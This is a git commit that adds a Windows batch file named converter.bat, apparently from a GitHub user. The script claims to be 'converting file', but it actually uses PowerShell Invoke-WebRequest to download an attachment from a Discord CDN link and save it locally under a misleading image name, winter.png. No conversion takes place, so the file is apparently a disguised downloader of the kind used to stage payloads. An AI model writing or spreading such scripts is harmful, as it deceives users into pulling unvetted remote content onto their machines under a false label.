9d6582b229da9d9bc83bf499d4c8f8d96748c73c
Empire <104152235+Empire4946@users.noreply.github.com>
2022-08-02 01:47:14 +0800

    Create converter.bat

---
+++ converter.bat
@@ -0,0 +1,4 @@
+@echo off
+title convert
+echo converting file
+powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/503045718102114309/990285885490753586/real_proof.txt" -Outfile "C:\locationuwant\winter.png"
